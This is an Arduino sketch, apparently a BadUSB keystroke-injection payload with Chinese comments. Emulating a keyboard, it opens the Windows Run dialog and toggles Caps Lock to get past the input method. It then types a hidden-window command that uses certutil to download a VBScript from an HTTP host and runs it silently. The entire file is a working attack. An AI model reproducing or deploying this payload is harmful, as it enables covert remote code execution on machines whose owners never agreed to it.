#include <Keyboard.h>
void setup() {
  // putpower shell your setup code here, to run once
  Keyboard.begin();//开始键盘通讯 
delay(1000);//延时 
Keyboard.press(KEY_LEFT_GUI);//win键 
delay(200);
Keyboard.press('r');//r键
delay(200); 
Keyboard.release(KEY_LEFT_GUI);
Keyboard.release('r'); 
Keyboard.press(KEY_CAPS_LOCK);//利用开大写输小写绕过输入法
Keyboard.release(KEY_CAPS_LOCK);
delay(300);
Keyboard.println("cmd /q /c mode con:COLS=15 LINES=1 && certutil -urlcache -split -f http://127.0.0.1:8080/run.vbs d:\\run.vbs && timeout /t 1 && start /B d:\\run.vbs" );  //无回显
//Keyboard.println("cmd /T:01 /K \"@echo off && mode con:COLS=15 LINES=1\"");   //有回显
Keyboard.press(KEY_RETURN); 
Keyboard.release(KEY_RETURN); 
Keyboard.press(KEY_RETURN);
Keyboard.release(KEY_RETURN);
Keyboard.press(KEY_CAPS_LOCK); 
Keyboard.release(KEY_CAPS_LOCK);
Keyboard.end();//结束键盘通讯 
}
 
void loop() {
  // put your main code here, to run repeatedly:
 
}